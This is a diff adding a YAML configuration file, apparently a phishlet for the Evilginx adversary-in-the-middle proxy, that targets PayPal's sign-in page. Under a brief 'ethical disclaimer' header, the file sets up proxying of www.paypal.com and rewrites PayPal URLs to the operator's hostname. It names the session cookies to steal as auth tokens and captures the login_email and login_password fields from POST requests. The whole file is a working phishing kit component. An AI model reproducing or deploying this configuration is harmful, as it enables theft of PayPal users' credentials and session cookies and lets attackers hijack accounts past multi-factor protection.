@@ -1,0 +1,21 @@
+# VANTABLACK PROJECT | ETHICAL DISCLAIMER: USAGE AUTORISÉ UNIQUEMENT
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'paypal.com', session: true, is_landing: true}
+sub_filters:
+  - {triggers_on: 'www.paypal.com', orig_sub: 'www', domain: 'paypal.com', search: 'https://www.paypal.com/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/javascript']}
+auth_tokens:
+  - domain: '.paypal.com'
+    keys: ['ts', 'ts_c', 'enforce_policy', 'lgnjs', 'KHclPrC0S_7=']
+credentials:
+  username:
+    key: 'login_email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'login_password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'www.paypal.com'
+  path: '/signin'
